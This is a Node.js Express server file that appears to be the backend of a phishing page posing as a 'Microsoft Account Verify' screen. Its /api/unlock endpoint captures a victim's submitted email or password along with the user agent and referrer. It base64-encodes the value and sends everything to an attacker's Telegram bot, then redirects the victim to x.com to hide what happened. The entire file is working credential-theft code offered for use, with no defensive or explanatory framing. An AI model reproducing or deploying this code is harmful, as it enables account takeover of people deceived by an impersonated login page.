// server.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(__dirname));

// Add as many URLs as you want here. The script will pick one at random.
const REDIRECT_URLS = [
  "https://x.com/",
  "https://x.com"
];

// Base64 encode function for Node.js
function base64Encode(str) {
  return Buffer.from(str, 'utf-8').toString('base64');
}

app.post('/api/unlock', async (req, res) => {
  try {
    // Capture the email (and fallback to password just in case)
    const { email, password, userAgent, referrer } = req.body;
    const submittedValue = email || password || 'No input provided';
    
    // Base64 encode the captured value
    const encodedValue = base64Encode(submittedValue);

    console.log('Received verify request. Value provided:', submittedValue);
    console.log('Encoded value:', encodedValue);

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Missing Telegram environment variables");
      return res.status(500).json({ 
        success: false, 
        error: "Server configuration error" 
      });
    }

    const now = new Date().toLocaleString('en-US', { 
      timeZone: 'America/New_York',
      year: 'numeric', 
      month: 'short', 
      day: 'numeric',
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit'
    });

    // Format the message for Telegram with encoded email
    const message = 
      `SUCCESSFUL VERIFICATION\n` +
      `Page: Microsoft Account Verify\n` +
      `Time: ${now}\n` +
      `User Agent: ${userAgent || 'unknown'}\n` +
      `Referrer: ${referrer || 'direct'}\n` +
      `Captured Email: ${submittedValue}\n` +
      `Encoded Email: ${encodedValue}\n` +
      `Client accessed the verification page.`;

    // Send the notification to Telegram
    try {
      const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message
      });
      console.log('✅ Telegram notification sent successfully');
    } catch (telegramError) {
      if (telegramError.response) {
        console.error('❌ Telegram Error Status:', telegramError.response.status);
        console.error('❌ Telegram Error Data:', JSON.stringify(telegramError.response.data));
      } else {
        console.error('❌ Telegram Error:', telegramError.message);
      }
    }

    // Pick a random URL and redirect
    const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];

    // Send success response with redirect URL
    res.json({ 
      success: true, 
      redirectUrl: randomUrl 
    });

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: "Failed to process request" 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
